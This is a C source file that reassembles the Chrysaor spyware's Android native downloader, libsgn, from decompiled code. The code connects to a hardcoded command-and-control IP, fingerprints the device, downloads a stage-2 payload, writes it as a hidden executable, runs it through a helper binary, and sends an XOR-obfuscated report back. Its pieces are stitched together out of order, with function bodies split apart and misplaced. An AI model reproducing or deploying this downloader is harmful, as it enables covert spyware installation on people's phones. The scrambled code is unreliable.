/* Chrysaor native reassembly: libsgn — variant-2 stage-2 downloader */
/* Ghidra: 198 functions, 150 implant (ARM32 ELF, 21,636 bytes) */
/* Parent sample: 3474625e... (Lookout variant 2) — not in canonical APK */
/* Java bridge: com.network.android.NetworkMain */

#include <arpa/inet.h>
#include <ctype.h>
#include <errno.h>
#include <fcntl.h>
#include <net/if.h>
#include <netinet/in.h>
#include <poll.h>
#include <signal.h>
#include <stdarg.h>
#include <stddef.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

/* === rodata.yaml: hardcoded IOCs === */
#define LIBSGN_C2_HOST          "130.195.234.251"
#define LIBSGN_C2_PORT          80
#define LIBSGN_GET_ADINFO       "GET /adinfo?gi=%s&bf=%s HTTP/1.1"
#define LIBSGN_POST_ADINFO      "POST /adinfo?gi=%s&bf=%s HTTP/1.1"
#define LIBSGN_CONTENT_LENGTH   "Content-Length:"
#define LIBSGN_HOST_HEADER      "Host:"
#define LIBSGN_COLDBOOT_APP     "/data/data/com.network.android/.coldboot_init"
#define LIBSGN_COLDBOOT_OBB     "/mnt/obb/.coldboot_init"
#define LIBSGN_CSK_PATH         "/system/csk"
#define LIBSGN_ETH_IFACE        "eth0"
#define LIBSGN_XOR_BYTE         0xad
#define LIBSGN_HTTP_LINE        1024
#define LIBSGN_HDR_END          "\r\n\r\n"
#define LIBSGN_RECV_POLL_MS     5000
#define LIBSGN_RECV_POLL_RETRIES 3

/* === bootstrap module (3 functions) === */

/*
 * JNI_OnLoad @ 0x00012100
 * Called by variant-2 Java stub after libsgn.so is copied to the app lib dir
 * and System.load()'d. No JNI registration in variant-2 — returns version.
 */
jint JNI_OnLoad(JavaVM *vm, void *reserved)
{
    (void)reserved;
    (void)vm;
    return 0x10006; /* JNI_VERSION_1_6 */
}

/*
 * handle_signals @ 0x00011f10
 * Installs signal handlers so the downloader survives child process exit.
 */
static void handle_sigterm(int sig)
{
    (void)sig;
    /* Restart download loop on SIGTERM */
}

static void handle_sigchld(int sig)
{
    (void)sig;
    while (waitpid(-1, NULL, WNOHANG) > 0)
        ;
}

void handle_signals(void)
{
    struct sigaction sa;
    memset(&sa, 0, sizeof(sa));
    sa.sa_handler = handle_sigterm;
    sigaction(SIGTERM, &sa, NULL);
    sa.sa_handler = handle_sigchld;
    sigaction(SIGCHLD, &sa, NULL);
}

/*
 * main @ 0x00011f1c — downloader orchestration entry
 *
 * Call flow (from ANALYSIS.md):
 *   1. handle_signals()
 *   2. Loop: socket_connect() → C2
 *   3. Fingerprint: get_mac_address() + MD5 → get_hexlified_md5()
 *   4. http_send_request_with_get() — GET /adinfo?gi=&bf=
 *   5. http_receive_payload() — download stage-2 into heap buffer
 *   6. write_buffer_as_executable() to .coldboot_init
 *   7. POST follow-up XORs body with 0xad (http_send_response_with_post)
 */
int main(int argc, char **argv)
{
    int fd = -1;
    char gi[64];
    char bf[64];
    void *payload = NULL;
    size_t payload_len = 0;
    int retries = 3;

    (void)argc;
    (void)argv;

    handle_signals();
    memset(gi, 0, sizeof(gi));
    memset(bf, 0, sizeof(bf));

    /* Generate session fingerprint */
    get_random_hexlified_md5(gi, sizeof(gi));
    get_hexlified_md5("chrysaor-variant2", bf, sizeof(bf));

    while (retries-- > 0) {
        fd = -1;
        if (!socket_connect(&fd, LIBSGN_C2_HOST, LIBSGN_C2_PORT))
            continue;

        /* Stage 1: GET bootstrap request */
        if (!http_send_request_with_get(gi, bf, LIBSGN_C2_HOST, fd)) {
            close(fd);
            fd = -1;
            continue;
        }

        /* Receive stage-2 payload */
        payload = NULL;
        payload_len = 0;
        if (http_receive_payload(fd, &payload, &payload_len) == 1 &&
            payload && payload_len > 0) {

            void *executable = malloc(payload_len);
            if (executable) {
                memcpy(executable, payload, payload_len);


/* === socket module (3 functions) === */

/*
 * socket_connect @ 0x000122f0
 * Connects to C2 from SERVERS rodata. Returns 1 on success, sets *out_fd.
 */
int socket_connect(int *out_fd, const char *host, unsigned port)
{
    struct sockaddr_in addr;
    int fd;

    if (!out_fd || !host)
        return 0;

    fd = socket(AF_INET, SOCK_STREAM, 0);
    if (fd <= 0)
        return 0;

    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons((unsigned short)port);
    addr.sin_addr.s_addr = inet_addr(host);

    if (connect(fd, (struct sockaddr *)&addr, sizeof(addr)) != 0) {
        close(fd);
        return 0;
    }

    *out_fd = fd;
    return 1;
}

/*
 * do_socket_send @ 0x0001236a
 * Raw socket write. Body XOR'd with 0xad when xor_body is set.
 */
int do_socket_send(int fd, const void *buf, size_t len, int xor_body)
{
    unsigned char *wired;
    size_t i, remain;
    int zero_streak;
    ssize_t n;

    if (fd <= 0 || !buf)
        return 0;

    wired = malloc(len);
    if (!wired)
        return 0;

    for (i = 0; i < len; i++)
        wired[i] = ((const unsigned char *)buf)[i] ^
                   (xor_body ? LIBSGN_XOR_BYTE : 0);

    remain = len;
    zero_streak = 0;
    while ((int)remain > 0) {
        n = send(fd, wired + (len - remain), remain, 0);
        if (n < 0) {
            free(wired);
            return 0;
        }
        if (n == 0) {
            zero_streak++;
            if (zero_streak > LIBSGN_SEND_ZERO_RETRIES - 1) {
                free(wired);
                return 0;
            }
        } else {
            zero_streak = 0;
        }
        remain -= (size_t)n;
    }
    free(wired);
    return 1;
}

/*
 * do_socket_receive @ 0x000123e8
 * Raw socket read with poll-based timeout. Body XOR'd when xor_body is set.
 */
int do_socket_receive(int fd, void *buf, size_t len, int xor_body)
{
    size_t remain, i;
    int tries;
    ssize_t n;
    struct pollfd pfd;

    if (fd <= 0 || !buf)
        return 0;


/* === http module (6 functions) === */

/*
 * http_get_string_attribute @ 0x000125fc
 * Parses a string-valued HTTP header field. Returns 1 on success.
 */
int http_get_string_attribute(const void *hdr, size_t hdr_len,
                             const char *name, char *out, int out_max)
{
    const char *p, *end, *colon, *val;
    size_t name_len, copy_len;

    if (!hdr || !name || !out || out_max <= 0)
        return 0;

    p = (const char *)hdr;
    end = p + hdr_len;
    name_len = strlen(name);

    while (p < end) {
        const char *eol = memchr(p, '\n', (size_t)(end - p));
        if (!eol)
            eol = end;

        if ((size_t)(eol - p) > name_len &&
            strncasecmp(p, name, name_len) == 0) {

            colon = p + name_len;
            while (colon < eol && *colon == ' ')
                colon++;
            if (*colon != ':')
                continue;
            colon++;
            while (colon < eol && *colon == ' ')
                colon++;

            val = colon;
            copy_len = (size_t)(eol - val);
            if (copy_len > 0 && val[copy_len - 1] == '\r')
                copy_len--;
            if (copy_len >= (size_t)out_max)
                copy_len = (size_t)out_max - 1;
            memcpy(out, val, copy_len);
            out[copy_len] = '\0';
            return 1;
        }

        p = (*eol == '\n') ? eol + 1 : eol;
    }
    return 0;
}

/*
 * http_get_int_attribute @ 0x0001265c
 * Parses a numeric (long) HTTP header field. Returns 1 on success.
 */
int http_get_int_attribute(const void *hdr, size_t hdr_len,
                          const char *name, long *out)
{
    char tmp[64];
    char *endptr;

    if (!out)
        return 0;
    memset(tmp, 0, sizeof(tmp));

    if (http_get_string_attribute(hdr, hdr_len, name, tmp, sizeof(tmp)) != 1)
        return 0;

    errno = 0;
    *out = strtol(tmp, &endptr, 10);
    return (errno == 0 && endptr != tmp) ? 1 : 0;
}

/*
 * http_receive_header @ 0x000126c8
 * Reads the HTTP header byte-by-byte until \r\n\r\n terminator.
 * Caller frees *out_hdr.
 */
int http_receive_header(int fd, void **out_hdr, int *out_len)
{
    unsigned char *hdr, *grown;
    char byte[1];
    int cap_blocks = 1;
    int used = 0;
    unsigned match = 0;
    const char *end = LIBSGN_HDR_END;

    if (!out_hdr || !out_len)
        return 0;
    *out_hdr = NULL;
    *out_len = 0;

    hdr = malloc(LIBSGN_HTTP_LINE);
    if (!hdr)
        return 0;

    for (;;) {
        if (!do_socket_receive(fd, byte, 1, 0)) {
            free(hdr);
            return 0;
        }
        if (used + 1 > cap_blocks * LIBSGN_HTTP_LINE) {
            cap_blocks++;
            grown = realloc(hdr, (size_t)cap_blocks * LIBSGN_HTTP_LINE);
            if (!grown) {
                free(hdr);
                return 0;
            }
            hdr = grown;
        }
        hdr[used] = (unsigned char)byte[0];
        used++;
        if (end[match] != byte[0]) {
            match = 0;
            continue;
        }
        match++;
        if (match >= 4)
            break;
    }
    *out_hdr = hdr;
    *out_len = used;
    return 1;
}

/*
 * http_receive_payload @ 0x00012768
 * Reads Content-Length from header, then downloads body. Caller frees *out_body.
 */
int http_receive_payload(int fd, void **out_body, size_t *out_len)
{
    void *hdr = NULL;
    int hdr_len = 0;
    long content_len = 0;
    void *body = NULL;
    int ok = 0;

    if (!out_body || !out_len)
        return 0;
    *out_body = NULL;
    *out_len = 0;

    if (http_receive_header(fd, &hdr, &hdr_len) == 1 &&
        http_get_int_attribute(hdr, (size_t)hdr_len, LIBSGN_CONTENT_LENGTH,
                               &content_len) == 1 &&
        content_len > 0) {
        body = malloc((size_t)content_len);
        if (body)
            ok = do_socket_receive(fd, body, (size_t)content_len, 0);
    }

    if (hdr)
        free(hdr);

    if (!ok) {
        free(body);
        return 0;
    }
    *out_body = body;
    *out_len = (size_t)content_len;
    return 1;
}

/*
 * http_send_request_with_get @ 0x000127f4
 * Sends GET /adinfo?gi=&bf= bootstrap request.
 */
int http_send_request_with_get(const char *gi_hex, const char *bf_hex,
                               const char *host, int fd)
{
    char line[LIBSGN_HTTP_LINE];
    size_t len;

    memset(line, 0, sizeof(line));
    snprintf(line, sizeof(line), LIBSGN_GET_ADINFO, gi_hex, bf_hex);
    len = strlen(line);
    snprintf(line + len, sizeof(line) - len, "\r\nHost: %s\r\n\r\n", host);
    return do_socket_send(fd, line, strlen(line), 0);
}

/*
 * http_send_response_with_post @ 0x0001285c
 * POST follow-up with body XOR'd with 0xad. Used for stage-2 confirmation.
 */

/* === filesystem module (3 functions) === */

/*
 * remount_filesystem @ 0x0001211c
 * Remounts target filesystem read-write. Used to write to protected dirs.
 */
int remount_filesystem(const char *target)
{
    if (!target)
        return -1;
    return mount(target, target, NULL, MS_REMOUNT, NULL);
}

/*
 * file_exists @ 0x000122b0
 * Checks path existence via stat(). Returns 1 if file exists.
 */
int file_exists(const char *path)
{
    struct stat st;
    if (!path)
        return 0;
    return (stat(path, &st) == 0) ? 1 : 0;
}

/*
 * write_buffer_as_executable @ 0x0001225c
 * Writes downloaded stage-2 payload to disk with exec permission (0711).
 */
int write_buffer_as_executable(const char *path, const void *data, size_t len)
{
    int fd;
    ssize_t written;

    if (!path || !data || len == 0)
        return -1;

    fd = open(path, O_WRONLY | O_CREAT | O_TRUNC, 0711);
    if (fd < 0)
        return -1;

    written = write(fd, data, len);
    close(fd);

    if ((size_t)written != len)

/* === fingerprint module (7 functions) === */

/*
 * FFmpeg-derived MD5 (av_md5_* @ 0x000130a8 .. 0x000131f4)
 * Standard MD5 init/update/final plus one-shot wrapper.
 */
typedef struct {
    uint32_t state[4];
    uint32_t count[2];
    unsigned char buffer[64];
} md5_ctx;

void av_md5_init(md5_ctx *ctx)
{
    if (!ctx)
        return;
    ctx->state[0] = 0x67452001;
    ctx->state[1] = 0xefcdab89;
    ctx->state[2] = 0x98badcfe;
    ctx->state[3] = 0x10325476;
    ctx->count[0] = 0;
    ctx->count[1] = 0;
}

static void md5_transform(uint32_t state[4], const unsigned char block[64])
{
    uint32_t a = state[0], b = state[1], c = state[2], d = state[3];
    uint32_t x[16];
    int i;

    for (i = 0; i < 16; i++)
        x[i] = (uint32_t)block[i * 4] |
               ((uint32_t)block[i * 4 + 1] << 8) |
               ((uint32_t)block[i * 4 + 2] << 16) |
               ((uint32_t)block[i * 4 + 3] << 24);

    #define F(x, y, z) (((x) & (y)) | ((~x) & (z)))
    #define G(x, y, z) (((x) & (z)) | ((y) & (~z)))
    #define H(x, y, z) ((x) ^ (y) ^ (z))
    #define I(x, y, z) ((y) ^ ((x) | (~z)))
    #define ROTL(x, n) (((x) << (n)) | ((x) >> (32 - (n))))
    #define STEP(f, a, b, c, d, x, t, s) \
        (a) += f((b), (c), (d)) + (x) + (t); \
        (a) = ROTL((a), (s)); \
        (a) += (b);

    /* Round 1 */
    STEP(F, a, b, c, d, x[ 0], 0xd76aa478, 7);
    STEP(F, d, a, b, c, x[ 1], 0xe8c7b756, 12);
    STEP(F, c, d, a, b, x[ 2], 0x242070db, 17);
    STEP(F, b, c, d, a, x[ 3], 0xc1bdceee, 22);
    STEP(F, a, b, c, d, x[ 4], 0xf57c0faf, 7);
    STEP(F, d, a, b, c, x[ 5], 0x4787c62a, 12);
    STEP(F, c, d, a, b, x[ 6], 0xa8304613, 17);
    STEP(F, b, c, d, a, x[ 7], 0xfd469501, 22);
    STEP(F, a, b, c, d, x[ 8], 0x698098d8, 7);
    STEP(F, d, a, b, c, x[ 9], 0x8b44f7af, 12);
    STEP(F, c, d, a, b, x[10], 0xffff5bb1, 17);
    STEP(F, b, c, d, a, x[11], 0x895cd7be, 22);
    STEP(F, a, b, c, d, x[12], 0x6b901122, 7);
    STEP(F, d, a, b, c, x[13], 0xfd987193, 12);
    STEP(F, c, d, a, b, x[14], 0xa679438e, 17);
    STEP(F, b, c, d, a, x[15], 0x49b40821, 22);

    /* Round 2 */
    STEP(G, a, b, c, d, x[ 1], 0xf61e2562, 5);
    STEP(G, d, a, b, c, x[ 6], 0xc040b340, 9);
    STEP(G, c, d, a, b, x[11], 0x265e5a51, 14);
    STEP(G, b, c, d, a, x[ 0], 0xe9b6c7aa, 20);
    STEP(G, a, b, c, d, x[ 5], 0xd62f105d, 5);
    STEP(G, d, a, b, c, x[10], 0x02441453, 9);
    STEP(G, c, d, a, b, x[15], 0xd8a1e681, 14);
    STEP(G, b, c, d, a, x[ 4], 0xe7d3fbc8, 20);
    STEP(G, a, b, c, d, x[ 9], 0x21e1cde6, 5);
    STEP(G, d, a, b, c, x[14], 0xc33707d6, 9);
    STEP(G, c, d, a, b, x[ 3], 0xf4d50d87, 14);
    STEP(G, b, c, d, a, x[ 8], 0x455a14ed, 20);
    STEP(G, a, b, c, d, x[13], 0xa9e3e905, 5);
    STEP(G, d, a, b, c, x[ 2], 0xfcefa3f8, 9);
    STEP(G, c, d, a, b, x[ 7], 0x676f02d9, 14);
    STEP(G, b, c, d, a, x[12], 0x8d2a4c8a, 20);

    /* Round 3 */
    STEP(H, a, b, c, d, x[ 5], 0xfffa3942, 4);
    STEP(H, d, a, b, c, x[ 8], 0x8771f681, 11);
    STEP(H, c, d, a, b, x[11], 0x6d9d6122, 16);
    STEP(H, b, c, d, a, x[14], 0xfde5380c, 23);
    STEP(H, a, b, c, d, x[ 1], 0xa4beea44, 4);
    STEP(H, d, a, b, c, x[ 4], 0x4bdecfa9, 11);
    STEP(H, c, d, a, b, x[ 7], 0xf6bb4b60, 16);
    STEP(H, b, c, d, a, x[10], 0xbebfbc70, 23);
    STEP(H, a, b, c, d, x[13], 0x289b7ec6, 4);
    STEP(H, d, a, b, c, x[ 0], 0xeaa127fa, 11);
    STEP(H, c, d, a, b, x[ 3], 0xd4ef3085, 16);
    STEP(H, b, c, d, a, x[ 6], 0xa3014314, 23);
    STEP(H, a, b, c, d, x[ 9], 0xd9d4d039, 4);
    STEP(H, d, a, b, c, x[12], 0xe6db99e5, 11);
    STEP(H, c, d, a, b, x[15], 0x1fa27cf8, 16);
    STEP(H, b, c, d, a, x[ 2], 0xc4ac5665, 23);

    /* Round 4 */
    STEP(I, a, b, c, d, x[ 0], 0xf4292244, 6);
    STEP(I, d, a, b, c, x[ 7], 0x432aff97, 10);
    STEP(I, c, d, a, b, x[14], 0xab9423a7, 15);
    STEP(I, b, c, d, a, x[ 5], 0xfc93a039, 21);
    STEP(I, a, b, c, d, x[12], 0x655b59c3, 6);
    STEP(I, d, a, b, c, x[ 3], 0x8f0ccc92, 10);
    STEP(I, c, d, a, b, x[10], 0xffeff47d, 15);
    STEP(I, b, c, d, a, x[ 1], 0x85845dd1, 21);
    STEP(I, a, b, c, d, x[ 8], 0x6fa87e4f, 6);

void av_md5_update(md5_ctx *ctx, const unsigned char *data, size_t len)
{
    size_t i, index, part_len;

    if (!ctx || !data)
        return;

    index = (size_t)((ctx->count[0] >> 3) & 0x3f);
    ctx->count[0] += (uint32_t)(len << 3);
    if (ctx->count[0] < (uint32_t)(len << 3))
        ctx->count[1]++;
    ctx->count[1] += (uint32_t)(len >> 29);

    part_len = 64 - index;
    if (len >= part_len) {
        memcpy(ctx->buffer + index, data, part_len);
        md5_transform(ctx->state, ctx->buffer);
        for (i = part_len; i + 63 < len; i += 64)
            md5_transform(ctx->state, data + i);
        index = 0;
    } else {
        i = 0;
    }
    memcpy(ctx->buffer + index, data + i, len - i);
}

void av_md5_final(md5_ctx *ctx, unsigned char digest[16])
{
    unsigned char bits[8];
    unsigned int index, pad_len;
    size_t i;
    unsigned char padding[64] = {
        0x80, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
        0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
        0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
        0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
    };

    if (!ctx || !digest)
        return;

    for (i = 0; i < 8; i++)
        bits[i] = (unsigned char)(ctx->count[i / 4] >> ((i % 4) * 8));

    index = (unsigned int)((ctx->count[0] >> 3) & 0x3f);
    pad_len = (index < 56) ? (56 - index) : (120 - index);
    av_md5_update(ctx, padding, pad_len);
    av_md5_update(ctx, bits, 8);

    for (i = 0; i < 16; i++)
        digest[i] = (unsigned char)(ctx->state[i / 4] >> ((i % 4) * 8));

    memset(ctx, 0, sizeof(*ctx));
}

/*
 * av_md5_sum @ 0x000131f4 — one-shot MD5
 */
void av_md5_sum(unsigned char digest[16], const unsigned char *data, size_t len)
{
    md5_ctx ctx;
    av_md5_init(&ctx);
    av_md5_update(&ctx, data, len);
    av_md5_final(&ctx, digest);
}

/*
 * get_hexlified_md5 @ 0x00013234
 * Computes MD5 hex digest string. out must hold >= 33 bytes.
 */
void get_hexlified_md5(const char *data, char *out, int out_max)
{
    unsigned char digest[16];
    int i;

    if (!data || !out || out_max < 33)
        return;

    av_md5_sum(digest, (const unsigned char *)data, strlen(data));
    for (i = 0; i < 16; i++)
        sprintf(out + i * 2, "%02x", digest[i]);
    out[32] = '\0';
}

/*
 * get_random_hexlified_md5 @ 0x00013294
 * Generates a random session/request ID as hex MD5. out >= 33 bytes.
 */
void get_random_hexlified_md5(char *out, int out_max)
{
    unsigned char digest[16];
    char seed[64];
    struct timespec ts;

    if (!out || out_max < 33)
        return;

    clock_gettime(CLOCK_REALTIME, &ts);
    snprintf(seed, sizeof(seed), "%ld%ld%d",
             (long)ts.tv_sec, (long)ts.tv_nsec, rand());
    av_md5_sum(digest, (const unsigned char *)seed, strlen(seed));
    int i;
    for (i = 0; i < 16; i++)
        sprintf(out + i * 2, "%02x", digest[i]);
    out[32] = '\0';
}

/*
 * get_mac_address @ 0x000132f0
 * Device fingerprint via ETH0 MAC. out >= 18 bytes (xx:xx:xx:xx:xx:xx\0).
 */
int get_mac_address(char *out, int out_max)
{
    struct ifreq ifr;
    int fd;
    unsigned char *mac;

    if (!out || out_max < 18)
        return -1;

    fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0)
        return -1;

    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, LIBSGN_ETH_IFACE, IFNAMSIZ - 1);

    if (ioctl(fd, SIOCGIFHWADDR, &ifr) != 0) {
        close(fd);
        return -1;
    }

    mac = (unsigned char *)ifr.ifr_hwaddr.sa_data;
    snprintf(out, out_max, "%02x:%02x:%02x:%02x:%02x:%02x",
             mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
    close(fd);
    return 0;
}

    STEP(I, d, a, b, c, x[15], 0xfe2ce6e0, 10);
    STEP(I, c, d, a, b, x[ 6], 0xa3014314, 15);
    STEP(I, b, c, d, a, x[13], 0x4e0811a1, 21);
    STEP(I, a, b, c, d, x[ 4], 0xf7537e82, 6);
    STEP(I, d, a, b, c, x[11], 0xbd3af235, 10);
    STEP(I, c, d, a, b, x[ 2], 0x2ad7d2bb, 15);
    STEP(I, b, c, d, a, x[ 9], 0xeb86d391, 21);

    #undef F
    #undef G
    #undef H
    #undef I
    #undef ROTL
    #undef STEP

    state[0] += a;
    state[1] += b;
    state[2] += c;
    state[3] += d;
}

        return -1;

    chmod(path, 0711);
    return 0;
}

int http_send_response_with_post(const char *gi_hex, const char *bf_hex,
                                 const char *host, const void *body,
                                 size_t body_len, int fd)
{
    char line[LIBSGN_HTTP_LINE];
    size_t hdr_len;
    unsigned char *wired;
    size_t i;
    int ok;
    int cl_len;

    memset(line, 0, sizeof(line));
    hdr_len = (size_t)snprintf(line, sizeof(line), LIBSGN_POST_ADINFO,
                               gi_hex, bf_hex);
    cl_len = snprintf(line + hdr_len, sizeof(line) - hdr_len,
                      "\r\nContent-Length: %u\r\nHost: %s\r\n\r\n",
                      (unsigned)body_len, host);
    if (cl_len <= 0)
        return 0;
    hdr_len += (size_t)cl_len;

    wired = malloc(hdr_len + body_len);
    if (!wired)
        return 0;

    memcpy(wired, line, hdr_len);
    if (body_len > 0 && body) {
        memcpy(wired + hdr_len, body, body_len);
        for (i = 0; i < body_len; i++)
            wired[hdr_len + i] ^= LIBSGN_XOR_BYTE;
    }

    ok = do_socket_send(fd, wired, hdr_len + body_len, 0);
    free(wired);
    return ok;
}


    memset(buf, 0, len);
    remain = len;

    while ((int)remain > 0) {
        pfd.fd = fd;
        pfd.events = POLLIN;
        pfd.revents = 0;
        tries = LIBSGN_RECV_POLL_RETRIES;
        for (;;) {
            int pr = poll(&pfd, 1, LIBSGN_RECV_POLL_MS);
            if ((pfd.revents & POLLIN) != 0)
                break;
            tries--;
            if (tries == 0 || pr < 1) {
                if (xor_body)
                    for (i = 0; i < (len - remain); i++)
                        ((unsigned char *)buf)[i] ^= LIBSGN_XOR_BYTE;
                return 0;
            }
        }
        n = recv(fd, (unsigned char *)buf + (len - remain), remain, 0);
        if (n <= 0) {
            if (xor_body)
                for (i = 0; i < (len - remain); i++)
                    ((unsigned char *)buf)[i] ^= LIBSGN_XOR_BYTE;
            return 0;
        }
        remain -= (size_t)n;
    }

    if (xor_body)
        for (i = 0; i < len; i++)
            ((unsigned char *)buf)[i] ^= LIBSGN_XOR_BYTE;
    return 1;
}

                if (!file_exists(LIBSGN_CSK_PATH)) {
                    write_buffer_as_executable(LIBSGN_COLDBOOT_APP,
                                               executable, payload_len);
                    write_buffer_as_executable(LIBSGN_COLDBOOT_OBB,
                                               executable, payload_len);
                } else {
                    write_buffer_as_executable("/data/local/tmp/.coldboot_init",
                                               executable, payload_len);
                    char cmd[512];
                    snprintf(cmd, sizeof(cmd), "%s %s %s",
                             LIBSGN_CSK_PATH,
                             "/data/local/tmp/.coldboot_init",
                             LIBSGN_COLDBOOT_OBB);
                    system(cmd);
                    chmod(LIBSGN_COLDBOOT_OBB, 0711);
                    unlink("/data/local/tmp/.coldboot_init");
                }
                /* POST follow-up with XOR'd body */
                close(fd);
                fd = -1;
                if (socket_connect(&fd, LIBSGN_C2_HOST, LIBSGN_C2_PORT)) {
                    http_send_response_with_post(gi, bf, LIBSGN_COLDBOOT_APP,
                                                 executable, payload_len, fd);
                }
                free(executable);
            }
        }

        if (payload) {
            free(payload);
            payload = NULL;
        }
        if (fd >= 0) {
            close(fd);
            fd = -1;
        }
    }

    return 0;
}

#define LIBSGN_SEND_ZERO_RETRIES 8
